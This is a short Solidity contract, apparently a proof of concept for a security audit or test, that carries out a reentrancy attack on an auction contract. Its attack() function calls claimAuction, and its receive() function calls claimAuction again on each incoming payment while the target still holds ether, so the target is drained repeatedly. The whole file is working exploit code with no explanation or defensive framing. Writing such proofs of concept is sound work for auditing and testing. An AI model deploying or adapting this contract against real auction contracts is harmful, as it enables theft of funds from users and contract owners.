// MaliciousReentrant.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IAuctions {
    function claimAuction(uint256 tokenId) external;
}

contract MaliciousReentrant {
    IAuctions public auctions;
    uint256 public tokenId;

    constructor(address _auctions, uint256 _tokenId) {
        auctions = IAuctions(_auctions);
        tokenId = _tokenId;
    }

    // Receive function to accept plain Ether transfers
    receive() external payable {
        // Attempt reentrancy if there's still balance to claim
        if (address(auctions).balance > 0) {
            auctions.claimAuction(tokenId);
        }
    }

    function attack() external {
        auctions.claimAuction(tokenId);
    }
}